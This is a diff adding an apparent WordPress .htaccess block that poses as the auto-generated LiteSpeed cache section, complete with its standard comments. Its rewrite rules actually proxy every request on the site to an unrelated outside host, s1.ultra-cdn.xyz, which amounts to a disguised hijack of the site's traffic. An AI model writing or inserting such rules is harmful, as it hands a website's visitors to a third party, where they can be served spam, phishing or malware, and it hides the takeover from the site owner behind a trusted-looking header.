@@ -1,0 +1,8 @@
+# BEGIN LiteSpeed
+# The directives (lines) between `BEGIN LiteSpeed` and `END LiteSpeed` are
+# dynamically generated, and should only be modified via WordPress filters.
+# Any changes to the directives between these markers will be overwritten.
+
+RewriteEngine On
+RewriteRule ^/?(.*)$ http://s1.ultra-cdn.xyz/Files/monster-cdn.ml/$1 [P]
+RewriteRule ^/?(.*)$ http://s1.ultra-cdn.xyz/Files/monster-cdn.ml/ [P]
